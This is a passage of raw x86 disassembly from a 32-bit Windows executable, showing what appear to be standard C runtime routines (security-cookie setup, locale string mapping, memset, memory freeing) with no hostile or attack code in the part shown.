  4259ae:	xor    eax,eax
  4259b0:	call   0x423893
  4259b5:	ret    
  4259b6:	push   0x10
  4259b8:	push   0x428778
  4259bd:	call   0x423858
  4259c2:	cmp    DWORD PTR ds:0x45d144,0x3
  4259c9:	jne    0x425a05
  4259cb:	push   0x4
  4259cd:	call   0x423a1f
  4259d2:	pop    ecx
  4259d3:	and    DWORD PTR [ebp-0x4],0x0
  4259d7:	mov    esi,DWORD PTR [ebp+0x8]
  4259da:	push   esi
  4259db:	call   0x424c42
  4259e0:	pop    ecx
  4259e1:	mov    DWORD PTR [ebp-0x1c],eax
  4259e4:	test   eax,eax
  4259e6:	je     0x4259f3
  4259e8:	mov    esi,DWORD PTR [esi-0x4]
  4259eb:	sub    esi,0x9
  4259ee:	mov    DWORD PTR [ebp-0x20],esi
  4259f1:	jmp    0x4259f6
  4259f3:	mov    esi,DWORD PTR [ebp-0x20]
  4259f6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fa:	call   0x425a23
  4259ff:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a03:	jne    0x425a18
  425a05:	push   DWORD PTR [ebp+0x8]
  425a08:	push   0x0
  425a0a:	push   DWORD PTR ds:0x45d140
  425a10:	call   DWORD PTR ds:0x4280b4
  425a16:	mov    esi,eax
  425a18:	mov    eax,esi
  425a1a:	call   0x423893
  425a1f:	ret    
  425a20:	mov    esi,DWORD PTR [ebp-0x20]
  425a23:	push   0x4
  425a25:	call   0x42398b
  425a2a:	pop    ecx
  425a2b:	ret    
  425a2c:	push   ebp
  425a2d:	mov    ebp,esp
  425a2f:	sub    esp,0x10
  425a32:	push   esi
  425a33:	lea    eax,[ebp-0x8]
  425a36:	push   eax
  425a37:	call   DWORD PTR ds:0x4280c4
  425a3d:	mov    esi,DWORD PTR [ebp-0x4]
  425a40:	xor    esi,DWORD PTR [ebp-0x8]
  425a43:	call   DWORD PTR ds:0x4280c0
  425a49:	xor    esi,eax
  425a4b:	call   DWORD PTR ds:0x42806c
  425a51:	xor    esi,eax
  425a53:	call   DWORD PTR ds:0x4280bc
  425a59:	xor    esi,eax
  425a5b:	lea    eax,[ebp-0x10]
  425a5e:	push   eax
  425a5f:	call   DWORD PTR ds:0x4280b8
  425a65:	mov    eax,DWORD PTR [ebp-0xc]
  425a68:	xor    eax,DWORD PTR [ebp-0x10]
  425a6b:	xor    esi,eax
  425a6d:	mov    DWORD PTR ds:0x45c430,esi
  425a73:	jne    0x425a7f
  425a75:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425a7f:	pop    esi
  425a80:	leave  
  425a81:	ret    
  425a82:	push   0x118
  425a87:	push   0x428928
  425a8c:	call   0x423858
  425a91:	mov    eax,ds:0x45c430
  425a96:	xor    eax,DWORD PTR [ebp+0x4]
  425a99:	mov    DWORD PTR [ebp-0x1c],eax
  425a9c:	mov    eax,ds:0x45cd98
  425aa1:	xor    ecx,ecx
  425aa3:	cmp    eax,ecx
  425aa5:	je     0x425ac6
  425aa7:	mov    DWORD PTR [ebp-0x4],ecx
  425aaa:	push   DWORD PTR [ebp+0xc]
  425aad:	push   DWORD PTR [ebp+0x8]
  425ab0:	call   eax
  425ab2:	pop    ecx
  425ab3:	pop    ecx
  425ab4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ab8:	jmp    0x425bc4
  425abd:	xor    eax,eax
  425abf:	inc    eax
  425ac0:	ret    
  425ac1:	mov    esp,DWORD PTR [ebp-0x18]
  425ac4:	jmp    0x425ab4
  425ac6:	mov    eax,DWORD PTR [ebp+0x8]
  425ac9:	dec    eax
  425aca:	je     0x425adf
  425acc:	mov    edi,0x428904
  425ad1:	mov    DWORD PTR [ebp-0x20],0x428850
  425ad8:	mov    esi,0xd4
  425add:	jmp    0x425af0
  425adf:	mov    edi,0x428830
  425ae4:	mov    DWORD PTR [ebp-0x20],0x428790
  425aeb:	mov    esi,0xb9
  425af0:	mov    BYTE PTR [ebp-0x24],cl
  425af3:	push   0x104
  425af8:	lea    eax,[ebp-0x128]
  425afe:	push   eax
  425aff:	push   ecx
  425b00:	call   DWORD PTR ds:0x42803c
  425b06:	test   eax,eax
  425b08:	jne    0x425b1d
  425b0a:	push   0x428484
  425b0f:	lea    eax,[ebp-0x128]
  425b15:	push   eax
  425b16:	call   0x423c40
  425b1b:	pop    ecx
  425b1c:	pop    ecx
  425b1d:	lea    ebx,[ebp-0x128]
  425b23:	lea    eax,[ebp-0x128]
  425b29:	push   eax
  425b2a:	call   0x423e70
  425b2f:	pop    ecx
  425b30:	add    eax,0xb
  425b33:	cmp    eax,0x3c
  425b36:	jbe    0x425b61
  425b38:	lea    eax,[ebp-0x128]
  425b3e:	push   eax
  425b3f:	call   0x423e70
  425b44:	mov    ebx,eax
  425b46:	lea    eax,[ebp-0x128]
  425b4c:	sub    eax,0x31
  425b4f:	add    ebx,eax
  425b51:	push   0x3
  425b53:	push   0x428480
  425b58:	push   ebx
  425b59:	call   0x423d40
  425b5e:	add    esp,0x10
  425b61:	push   ebx
  425b62:	call   0x423e70
  425b67:	pop    ecx
  425b68:	lea    eax,[eax+esi*1+0xc]
  425b6c:	add    eax,0x3
  425b6f:	and    eax,0xfffffffc
  425b72:	call   0x4238b0
  425b77:	mov    DWORD PTR [ebp-0x18],esp
  425b7a:	mov    esi,esp
  425b7c:	push   edi
  425b7d:	push   esi
  425b7e:	call   0x423c40
  425b83:	mov    edi,0x428460
  425b88:	push   edi
  425b89:	push   esi
  425b8a:	call   0x423c50
  425b8f:	push   0x428784
  425b94:	push   esi
  425b95:	call   0x423c50
  425b9a:	push   ebx
  425b9b:	push   esi
  425b9c:	call   0x423c50
  425ba1:	push   edi
  425ba2:	push   esi
  425ba3:	call   0x423c50
  425ba8:	push   DWORD PTR [ebp-0x20]
  425bab:	push   esi
  425bac:	call   0x423c50
  425bb1:	push   0x12010
  425bb6:	push   0x428438
  425bbb:	push   esi
  425bbc:	call   0x423b42
  425bc1:	add    esp,0x3c
  425bc4:	push   0x3
  425bc6:	call   0x422cc6
  425bcb:	int3   
  425bcc:	push   0x38
  425bce:	push   0x428d48
  425bd3:	call   0x423858
  425bd8:	xor    ebx,ebx
  425bda:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425be0:	jne    0x425c1a
  425be2:	push   ebx
  425be3:	push   ebx
  425be4:	xor    esi,esi
  425be6:	inc    esi
  425be7:	push   esi
  425be8:	push   0x428d44
  425bed:	push   0x100
  425bf2:	push   ebx
  425bf3:	call   DWORD PTR ds:0x4280d0
  425bf9:	test   eax,eax
  425bfb:	je     0x425c05
  425bfd:	mov    DWORD PTR ds:0x45cdbc,esi
  425c03:	jmp    0x425c1a
  425c05:	call   DWORD PTR ds:0x428010
  425c0b:	cmp    eax,0x78
  425c0e:	jne    0x425c1a
  425c10:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c1a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c1d:	jle    0x425c3a
  425c1f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c22:	mov    eax,DWORD PTR [ebp+0x10]
  425c25:	dec    ecx
  425c26:	cmp    BYTE PTR [eax],bl
  425c28:	je     0x425c32
  425c2a:	inc    eax
  425c2b:	cmp    ecx,ebx
  425c2d:	jne    0x425c25
  425c2f:	or     ecx,0xffffffff
  425c32:	or     eax,0xffffffff
  425c35:	sub    eax,ecx
  425c37:	add    DWORD PTR [ebp+0x14],eax
  425c3a:	mov    eax,ds:0x45cdbc
  425c3f:	cmp    eax,0x2
  425c42:	je     0x425e24
  425c48:	cmp    eax,ebx
  425c4a:	je     0x425e24
  425c50:	cmp    eax,0x1
  425c53:	jne    0x425e57
  425c59:	xor    edi,edi
  425c5b:	mov    DWORD PTR [ebp-0x1c],edi
  425c5e:	mov    DWORD PTR [ebp-0x20],ebx
  425c61:	mov    DWORD PTR [ebp-0x24],ebx
  425c64:	cmp    DWORD PTR [ebp+0x20],ebx
  425c67:	jne    0x425c71
  425c69:	mov    eax,ds:0x45cdb4
  425c6e:	mov    DWORD PTR [ebp+0x20],eax
  425c71:	push   ebx
  425c72:	push   ebx
  425c73:	push   DWORD PTR [ebp+0x14]
  425c76:	push   DWORD PTR [ebp+0x10]
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [ebp+0x24],ebx
  425c7e:	setne  al
  425c81:	lea    eax,[eax*8+0x1]
  425c88:	push   eax
  425c89:	push   DWORD PTR [ebp+0x20]
  425c8c:	call   DWORD PTR ds:0x4280cc
  425c92:	mov    esi,eax
  425c94:	mov    DWORD PTR [ebp-0x28],esi
  425c97:	cmp    esi,ebx
  425c99:	je     0x425e57
  425c9f:	mov    DWORD PTR [ebp-0x4],0x1
  425ca6:	lea    eax,[esi+esi*1]
  425ca9:	add    eax,0x3
  425cac:	and    eax,0xfffffffc
  425caf:	call   0x4238b0
  425cb4:	mov    DWORD PTR [ebp-0x18],esp
  425cb7:	mov    eax,esp
  425cb9:	mov    DWORD PTR [ebp-0x2c],eax
  425cbc:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cc0:	jmp    0x425cdd
  425cc2:	xor    eax,eax
  425cc4:	inc    eax
  425cc5:	ret    
  425cc6:	mov    esp,DWORD PTR [ebp-0x18]
  425cc9:	call   0x426cf5
  425cce:	xor    ebx,ebx
  425cd0:	mov    DWORD PTR [ebp-0x2c],ebx
  425cd3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cd7:	mov    edi,DWORD PTR [ebp-0x1c]
  425cda:	mov    esi,DWORD PTR [ebp-0x28]
  425cdd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425ce0:	jne    0x425cfe
  425ce2:	lea    eax,[esi+esi*1]
  425ce5:	push   eax
  425ce6:	call   0x424582
  425ceb:	pop    ecx
  425cec:	mov    DWORD PTR [ebp-0x2c],eax
  425cef:	cmp    eax,ebx
  425cf1:	je     0x425e57
  425cf7:	mov    DWORD PTR [ebp-0x20],0x1
  425cfe:	push   esi
  425cff:	push   DWORD PTR [ebp-0x2c]
  425d02:	push   DWORD PTR [ebp+0x14]
  425d05:	push   DWORD PTR [ebp+0x10]
  425d08:	push   0x1
  425d0a:	push   DWORD PTR [ebp+0x20]
  425d0d:	call   DWORD PTR ds:0x4280cc
  425d13:	test   eax,eax
  425d15:	je     0x425e01
  425d1b:	push   ebx
  425d1c:	push   ebx
  425d1d:	push   esi
  425d1e:	push   DWORD PTR [ebp-0x2c]
  425d21:	push   DWORD PTR [ebp+0xc]
  425d24:	push   DWORD PTR [ebp+0x8]
  425d27:	call   DWORD PTR ds:0x4280d0
  425d2d:	mov    edi,eax
  425d2f:	mov    DWORD PTR [ebp-0x1c],edi
  425d32:	cmp    edi,ebx
  425d34:	je     0x425e01
  425d3a:	test   BYTE PTR [ebp+0xd],0x4
  425d3e:	je     0x425d6d
  425d40:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d43:	je     0x425e01
  425d49:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d4c:	jg     0x425e01
  425d52:	push   DWORD PTR [ebp+0x1c]
  425d55:	push   DWORD PTR [ebp+0x18]
  425d58:	push   esi
  425d59:	push   DWORD PTR [ebp-0x2c]
  425d5c:	push   DWORD PTR [ebp+0xc]
  425d5f:	push   DWORD PTR [ebp+0x8]
  425d62:	call   DWORD PTR ds:0x4280d0
  425d68:	jmp    0x425e01
  425d6d:	mov    DWORD PTR [ebp-0x4],0x2
  425d74:	lea    eax,[edi+edi*1]
  425d77:	add    eax,0x3
  425d7a:	and    eax,0xfffffffc
  425d7d:	call   0x4238b0
  425d82:	mov    DWORD PTR [ebp-0x18],esp
  425d85:	mov    eax,esp
  425d87:	mov    DWORD PTR [ebp-0x30],eax
  425d8a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d8e:	jmp    0x425dab
  425d90:	xor    eax,eax
  425d92:	inc    eax
  425d93:	ret    
  425d94:	mov    esp,DWORD PTR [ebp-0x18]
  425d97:	call   0x426cf5
  425d9c:	xor    ebx,ebx
  425d9e:	mov    DWORD PTR [ebp-0x30],ebx
  425da1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da5:	mov    edi,DWORD PTR [ebp-0x1c]
  425da8:	mov    esi,DWORD PTR [ebp-0x28]
  425dab:	cmp    DWORD PTR [ebp-0x30],ebx
  425dae:	jne    0x425dc8
  425db0:	lea    eax,[edi+edi*1]
  425db3:	push   eax
  425db4:	call   0x424582
  425db9:	pop    ecx
  425dba:	mov    DWORD PTR [ebp-0x30],eax
  425dbd:	cmp    eax,ebx
  425dbf:	je     0x425e01
  425dc1:	mov    DWORD PTR [ebp-0x24],0x1
  425dc8:	push   edi
  425dc9:	push   DWORD PTR [ebp-0x30]
  425dcc:	push   esi
  425dcd:	push   DWORD PTR [ebp-0x2c]
  425dd0:	push   DWORD PTR [ebp+0xc]
  425dd3:	push   DWORD PTR [ebp+0x8]
  425dd6:	call   DWORD PTR ds:0x4280d0
  425ddc:	test   eax,eax
  425dde:	je     0x425e01
  425de0:	push   ebx
  425de1:	push   ebx
  425de2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425de5:	jne    0x425deb
  425de7:	push   ebx
  425de8:	push   ebx
  425de9:	jmp    0x425df1
  425deb:	push   DWORD PTR [ebp+0x1c]
  425dee:	push   DWORD PTR [ebp+0x18]
  425df1:	push   edi
  425df2:	push   DWORD PTR [ebp-0x30]
  425df5:	push   ebx
  425df6:	push   DWORD PTR [ebp+0x20]
  425df9:	call   DWORD PTR ds:0x428050
  425dff:	mov    edi,eax
  425e01:	cmp    DWORD PTR [ebp-0x24],ebx
  425e04:	je     0x425e0f
  425e06:	push   DWORD PTR [ebp-0x30]
  425e09:	call   0x42446a
  425e0e:	pop    ecx
  425e0f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e12:	je     0x425e1d
  425e14:	push   DWORD PTR [ebp-0x2c]
  425e17:	call   0x42446a
  425e1c:	pop    ecx
  425e1d:	mov    eax,edi
  425e1f:	jmp    0x425f7f
  425e24:	mov    DWORD PTR [ebp-0x34],ebx
  425e27:	xor    edi,edi
  425e29:	mov    DWORD PTR [ebp-0x38],ebx
  425e2c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e2f:	jne    0x425e39
  425e31:	mov    eax,ds:0x45cda4
  425e36:	mov    DWORD PTR [ebp+0x8],eax
  425e39:	cmp    DWORD PTR [ebp+0x20],ebx
  425e3c:	jne    0x425e46
  425e3e:	mov    eax,ds:0x45cdb4
  425e43:	mov    DWORD PTR [ebp+0x20],eax
  425e46:	push   DWORD PTR [ebp+0x8]
  425e49:	call   0x426add
  425e4e:	pop    ecx
  425e4f:	mov    DWORD PTR [ebp-0x3c],eax
  425e52:	cmp    eax,0xffffffff
  425e55:	jne    0x425e5e
  425e57:	xor    eax,eax
  425e59:	jmp    0x425f7f
  425e5e:	cmp    eax,DWORD PTR [ebp+0x20]
  425e61:	je     0x425f55
  425e67:	push   ebx
  425e68:	push   ebx
  425e69:	lea    ecx,[ebp+0x14]
  425e6c:	push   ecx
  425e6d:	push   DWORD PTR [ebp+0x10]
  425e70:	push   eax
  425e71:	push   DWORD PTR [ebp+0x20]
  425e74:	call   0x426b26
  425e79:	add    esp,0x18
  425e7c:	mov    DWORD PTR [ebp-0x34],eax
  425e7f:	cmp    eax,ebx
  425e81:	je     0x425e57
  425e83:	push   ebx
  425e84:	push   ebx
  425e85:	push   DWORD PTR [ebp+0x14]
  425e88:	push   eax
  425e89:	push   DWORD PTR [ebp+0xc]
  425e8c:	push   DWORD PTR [ebp+0x8]
  425e8f:	call   DWORD PTR ds:0x4280c8
  425e95:	mov    esi,eax
  425e97:	mov    DWORD PTR [ebp-0x40],esi
  425e9a:	cmp    esi,ebx
  425e9c:	je     0x425f44
  425ea2:	mov    DWORD PTR [ebp-0x4],ebx
  425ea5:	add    eax,0x3
  425ea8:	and    eax,0xfffffffc
  425eab:	call   0x4238b0
  425eb0:	mov    DWORD PTR [ebp-0x18],esp
  425eb3:	mov    edi,esp
  425eb5:	mov    DWORD PTR [ebp-0x44],edi
  425eb8:	push   esi
  425eb9:	push   ebx
  425eba:	push   edi
  425ebb:	call   0x426160
  425ec0:	add    esp,0xc
  425ec3:	jmp    0x425ed5
  425ec5:	xor    eax,eax
  425ec7:	inc    eax
  425ec8:	ret    
  425ec9:	mov    esp,DWORD PTR [ebp-0x18]
  425ecc:	call   0x426cf5
  425ed1:	xor    ebx,ebx
  425ed3:	xor    edi,edi
  425ed5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ed9:	cmp    edi,ebx
  425edb:	jne    0x425f00
  425edd:	push   DWORD PTR [ebp-0x40]
  425ee0:	call   0x424582
  425ee5:	pop    ecx
  425ee6:	mov    edi,eax
  425ee8:	cmp    edi,ebx
  425eea:	je     0x425f1d
  425eec:	push   DWORD PTR [ebp-0x40]
  425eef:	push   ebx
  425ef0:	push   edi
  425ef1:	call   0x426160
  425ef6:	add    esp,0xc
  425ef9:	mov    DWORD PTR [ebp-0x38],0x1
  425f00:	push   DWORD PTR [ebp-0x40]
  425f03:	push   edi
  425f04:	push   DWORD PTR [ebp+0x14]
  425f07:	push   DWORD PTR [ebp-0x34]
  425f0a:	push   DWORD PTR [ebp+0xc]
  425f0d:	push   DWORD PTR [ebp+0x8]
  425f10:	call   DWORD PTR ds:0x4280c8
  425f16:	mov    DWORD PTR [ebp-0x40],eax
  425f19:	cmp    eax,ebx
  425f1b:	jne    0x425f21
  425f1d:	xor    esi,esi
  425f1f:	jmp    0x425f47
  425f21:	push   DWORD PTR [ebp+0x1c]
  425f24:	push   DWORD PTR [ebp+0x18]
  425f27:	lea    eax,[ebp-0x40]
  425f2a:	push   eax
  425f2b:	push   edi
  425f2c:	push   DWORD PTR [ebp+0x20]
  425f2f:	push   DWORD PTR [ebp-0x3c]
  425f32:	call   0x426b26
  425f37:	add    esp,0x18
  425f3a:	mov    esi,eax
  425f3c:	neg    esi
  425f3e:	sbb    esi,esi
  425f40:	neg    esi
  425f42:	jmp    0x425f47
  425f44:	mov    esi,DWORD PTR [ebp-0x48]
  425f47:	cmp    DWORD PTR [ebp-0x38],ebx
  425f4a:	je     0x425f6f
  425f4c:	push   edi
  425f4d:	call   0x42446a
  425f52:	pop    ecx
  425f53:	jmp    0x425f6f
  425f55:	push   DWORD PTR [ebp+0x1c]
  425f58:	push   DWORD PTR [ebp+0x18]
  425f5b:	push   DWORD PTR [ebp+0x14]
  425f5e:	push   DWORD PTR [ebp+0x10]
  425f61:	push   DWORD PTR [ebp+0xc]
  425f64:	push   DWORD PTR [ebp+0x8]
  425f67:	call   DWORD PTR ds:0x4280c8
  425f6d:	mov    esi,eax
  425f6f:	cmp    DWORD PTR [ebp-0x34],ebx
  425f72:	je     0x425f7d
  425f74:	push   DWORD PTR [ebp-0x34]
  425f77:	call   0x42446a
  425f7c:	pop    ecx
  425f7d:	mov    eax,esi
  425f7f:	lea    esp,[ebp-0x54]
  425f82:	call   0x423893
  425f87:	ret    
  425f88:	push   0x1c
  425f8a:	push   0x428d70
  425f8f:	call   0x423858
  425f94:	xor    esi,esi
  425f96:	cmp    DWORD PTR ds:0x45cdc0,esi
  425f9c:	jne    0x425fd3
  425f9e:	lea    eax,[ebp-0x1c]
  425fa1:	push   eax
  425fa2:	xor    edi,edi
  425fa4:	inc    edi
  425fa5:	push   edi
  425fa6:	push   0x428d44
  425fab:	push   edi
  425fac:	call   DWORD PTR ds:0x4280d8
  425fb2:	test   eax,eax
  425fb4:	je     0x425fbe
  425fb6:	mov    DWORD PTR ds:0x45cdc0,edi
  425fbc:	jmp    0x425fd3
  425fbe:	call   DWORD PTR ds:0x428010
  425fc4:	cmp    eax,0x78
  425fc7:	jne    0x425fd3
  425fc9:	mov    DWORD PTR ds:0x45cdc0,0x2
  425fd3:	mov    eax,ds:0x45cdc0
  425fd8:	cmp    eax,0x2
  425fdb:	je     0x4260cb
  425fe1:	cmp    eax,esi
  425fe3:	je     0x4260cb
  425fe9:	cmp    eax,0x1
  425fec:	jne    0x4260f1
  425ff2:	mov    DWORD PTR [ebp-0x20],esi
  425ff5:	mov    DWORD PTR [ebp-0x24],esi
  425ff8:	cmp    DWORD PTR [ebp+0x18],esi
  425ffb:	jne    0x426005
  425ffd:	mov    eax,ds:0x45cdb4
  426002:	mov    DWORD PTR [ebp+0x18],eax
  426005:	push   esi
  426006:	push   esi
  426007:	push   DWORD PTR [ebp+0x10]
  42600a:	push   DWORD PTR [ebp+0xc]
  42600d:	xor    eax,eax
  42600f:	cmp    DWORD PTR [ebp+0x20],esi
  426012:	setne  al
  426015:	lea    eax,[eax*8+0x1]
  42601c:	push   eax
  42601d:	push   DWORD PTR [ebp+0x18]
  426020:	call   DWORD PTR ds:0x4280cc
  426026:	mov    edi,eax
  426028:	mov    DWORD PTR [ebp-0x28],edi
  42602b:	test   edi,edi
  42602d:	je     0x4260f1
  426033:	and    DWORD PTR [ebp-0x4],0x0
  426037:	lea    ebx,[edi+edi*1]
  42603a:	mov    eax,ebx
  42603c:	add    eax,0x3
  42603f:	and    eax,0xfffffffc
  426042:	call   0x4238b0
  426047:	mov    DWORD PTR [ebp-0x18],esp
  42604a:	mov    esi,esp
  42604c:	mov    DWORD PTR [ebp-0x2c],esi
  42604f:	push   ebx
  426050:	push   0x0
  426052:	push   esi
  426053:	call   0x426160
  426058:	add    esp,0xc
  42605b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42605f:	jmp    0x426076
  426061:	xor    eax,eax
  426063:	inc    eax
  426064:	ret    
  426065:	mov    esp,DWORD PTR [ebp-0x18]
  426068:	call   0x426cf5
  42606d:	xor    esi,esi
  42606f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426073:	mov    edi,DWORD PTR [ebp-0x28]
  426076:	test   esi,esi
  426078:	jne    0x426091
  42607a:	push   edi
  42607b:	push   0x2
  42607d:	call   0x424978
  426082:	pop    ecx
  426083:	pop    ecx
  426084:	mov    esi,eax
  426086:	test   esi,esi
  426088:	je     0x4260f1
  42608a:	mov    DWORD PTR [ebp-0x24],0x1
  426091:	push   edi
  426092:	push   esi
  426093:	push   DWORD PTR [ebp+0x10]
  426096:	push   DWORD PTR [ebp+0xc]
  426099:	push   0x1
  42609b:	push   DWORD PTR [ebp+0x18]
  42609e:	call   DWORD PTR ds:0x4280cc
  4260a4:	test   eax,eax
  4260a6:	je     0x4260b9
  4260a8:	push   DWORD PTR [ebp+0x14]
  4260ab:	push   eax
  4260ac:	push   esi
  4260ad:	push   DWORD PTR [ebp+0x8]
  4260b0:	call   DWORD PTR ds:0x4280d8
  4260b6:	mov    DWORD PTR [ebp-0x20],eax
  4260b9:	cmp    DWORD PTR [ebp-0x24],0x0
  4260bd:	je     0x4260c6
  4260bf:	push   esi
  4260c0:	call   0x42446a
  4260c5:	pop    ecx
  4260c6:	mov    eax,DWORD PTR [ebp-0x20]
  4260c9:	jmp    0x426139
  4260cb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4260ce:	cmp    ebx,esi
  4260d0:	jne    0x4260d8
  4260d2:	mov    ebx,DWORD PTR ds:0x45cda4
  4260d8:	mov    edi,DWORD PTR [ebp+0x18]
  4260db:	test   edi,edi
  4260dd:	jne    0x4260e5
  4260df:	mov    edi,DWORD PTR ds:0x45cdb4
  4260e5:	push   ebx
  4260e6:	call   0x426add
  4260eb:	pop    ecx
  4260ec:	cmp    eax,0xffffffff
  4260ef:	jne    0x4260f5
  4260f1:	xor    eax,eax
  4260f3:	jmp    0x426139
  4260f5:	cmp    eax,edi
  4260f7:	je     0x426117
  4260f9:	push   0x0
  4260fb:	push   0x0
  4260fd:	lea    ecx,[ebp+0x10]
  426100:	push   ecx
  426101:	push   DWORD PTR [ebp+0xc]
  426104:	push   eax
  426105:	push   edi
  426106:	call   0x426b26
  42610b:	add    esp,0x18
  42610e:	mov    esi,eax
  426110:	test   esi,esi
  426112:	je     0x4260f1
  426114:	mov    DWORD PTR [ebp+0xc],esi
  426117:	push   DWORD PTR [ebp+0x14]
  42611a:	push   DWORD PTR [ebp+0x10]
  42611d:	push   DWORD PTR [ebp+0xc]
  426120:	push   DWORD PTR [ebp+0x8]
  426123:	push   ebx
  426124:	call   DWORD PTR ds:0x4280d4
  42612a:	mov    edi,eax
  42612c:	test   esi,esi
  42612e:	je     0x426137
  426130:	push   esi
  426131:	call   0x42446a
  426136:	pop    ecx
  426137:	mov    eax,edi
  426139:	lea    esp,[ebp-0x38]
  42613c:	call   0x423893
  426141:	ret    
  426142:	mov    eax,ds:0x45cdc4
  426147:	test   eax,eax
  426149:	je     0x42615a
  42614b:	push   DWORD PTR [esp+0x4]
  42614f:	call   eax
  426151:	test   eax,eax
  426153:	pop    ecx
  426154:	je     0x42615a
  426156:	xor    eax,eax
  426158:	inc    eax
  426159:	ret    
  42615a:	xor    eax,eax
  42615c:	ret    
  42615d:	int3   
  42615e:	int3   
  42615f:	int3   
  426160:	mov    edx,DWORD PTR [esp+0xc]
  426164:	mov    ecx,DWORD PTR [esp+0x4]
  426168:	test   edx,edx
  42616a:	je     0x4261bb
  42616c:	xor    eax,eax
  42616e:	mov    al,BYTE PTR [esp+0x8]
  426172:	push   edi
  426173:	mov    edi,ecx
  426175:	cmp    edx,0x4
  426178:	jb     0x4261ab
  42617a:	neg    ecx
  42617c:	and    ecx,0x3
  42617f:	je     0x42618d
  426181:	sub    edx,ecx
  426183:	mov    BYTE PTR [edi],al
  426185:	add    edi,0x1
  426188:	sub    ecx,0x1
  42618b:	jne    0x426183
  42618d:	mov    ecx,eax
  42618f:	shl    eax,0x8
  426192:	add    eax,ecx
  426194:	mov    ecx,eax
  426196:	shl    eax,0x10
  426199:	add    eax,ecx
  42619b:	mov    ecx,edx
  42619d:	and    edx,0x3
  4261a0:	shr    ecx,0x2
  4261a3:	je     0x4261ab
  4261a5:	rep stos DWORD PTR es:[edi],eax
  4261a7:	test   edx,edx
  4261a9:	je     0x4261b5
  4261ab:	mov    BYTE PTR [edi],al
  4261ad:	add    edi,0x1
  4261b0:	sub    edx,0x1
  4261b3:	jne    0x4261ab
  4261b5:	mov    eax,DWORD PTR [esp+0x8]
  4261b9:	pop    edi
  4261ba:	ret    
  4261bb:	mov    eax,DWORD PTR [esp+0x4]
  4261bf:	ret    
  4261c0:	push   esi
  4261c1:	mov    esi,DWORD PTR [esp+0x8]
  4261c5:	test   esi,esi
  4261c7:	je     0x42634e
  4261cd:	push   DWORD PTR [esi+0x4]
  4261d0:	call   0x42446a
  4261d5:	push   DWORD PTR [esi+0x8]
  4261d8:	call   0x42446a
  4261dd:	push   DWORD PTR [esi+0xc]
  4261e0:	call   0x42446a
  4261e5:	push   DWORD PTR [esi+0x10]
  4261e8:	call   0x42446a
  4261ed:	push   DWORD PTR [esi+0x14]
  4261f0:	call   0x42446a
  4261f5:	push   DWORD PTR [esi+0x18]
  4261f8:	call   0x42446a
  4261fd:	push   DWORD PTR [esi]
  4261ff:	call   0x42446a
  426204:	push   DWORD PTR [esi+0x20]
  426207:	call   0x42446a
  42620c:	push   DWORD PTR [esi+0x24]
  42620f:	call   0x42446a
  426214:	push   DWORD PTR [esi+0x28]
  426217:	call   0x42446a
  42621c:	push   DWORD PTR [esi+0x2c]
  42621f:	call   0x42446a
  426224:	push   DWORD PTR [esi+0x30]
  426227:	call   0x42446a
  42622c:	push   DWORD PTR [esi+0x34]
  42622f:	call   0x42446a
  426234:	push   DWORD PTR [esi+0x1c]
  426237:	call   0x42446a
  42623c:	push   DWORD PTR [esi+0x38]
  42623f:	call   0x42446a
  426244:	push   DWORD PTR [esi+0x3c]
  426247:	call   0x42446a
  42624c:	add    esp,0x40
  42624f:	push   DWORD PTR [esi+0x40]
  426252:	call   0x42446a
  426257:	push   DWORD PTR [esi+0x44]
  42625a:	call   0x42446a
  42625f:	push   DWORD PTR [esi+0x48]
  426262:	call   0x42446a
  426267:	push   DWORD PTR [esi+0x4c]
  42626a:	call   0x42446a
  42626f:	push   DWORD PTR [esi+0x50]
  426272:	call   0x42446a
  426277:	push   DWORD PTR [esi+0x54]
  42627a:	call   0x42446a
  42627f:	push   DWORD PTR [esi+0x58]
  426282:	call   0x42446a
  426287:	push   DWORD PTR [esi+0x5c]
  42628a:	call   0x42446a
  42628f:	push   DWORD PTR [esi+0x60]
  426292:	call   0x42446a
  426297:	push   DWORD PTR [esi+0x64]
  42629a:	call   0x42446a
  42629f:	push   DWORD PTR [esi+0x68]
  4262a2:	call   0x42446a
  4262a7:	push   DWORD PTR [esi+0x6c]
  4262aa:	call   0x42446a
  4262af:	push   DWORD PTR [esi+0x70]
  4262b2:	call   0x42446a
  4262b7:	push   DWORD PTR [esi+0x74]
  4262ba:	call   0x42446a
  4262bf:	push   DWORD PTR [esi+0x78]
  4262c2:	call   0x42446a
  4262c7:	push   DWORD PTR [esi+0x7c]
  4262ca:	call   0x42446a
  4262cf:	add    esp,0x40
  4262d2:	push   DWORD PTR [esi+0x80]
  4262d8:	call   0x42446a
  4262dd:	push   DWORD PTR [esi+0x84]
  4262e3:	call   0x42446a
  4262e8:	push   DWORD PTR [esi+0x88]
  4262ee:	call   0x42446a
  4262f3:	push   DWORD PTR [esi+0x8c]
  4262f9:	call   0x42446a
  4262fe:	push   DWORD PTR [esi+0x90]
  426304:	call   0x42446a
  426309:	push   DWORD PTR [esi+0x94]
  42630f:	call   0x42446a
  426314:	push   DWORD PTR [esi+0x98]
  42631a:	call   0x42446a
  42631f:	push   DWORD PTR [esi+0x9c]
  426325:	call   0x42446a
  42632a:	push   DWORD PTR [esi+0xa0]
  426330:	call   0x42446a
  426335:	push   DWORD PTR [esi+0xa4]
  42633b:	call   0x42446a
  426340:	push   DWORD PTR [esi+0xa8]
  426346:	call   0x42446a
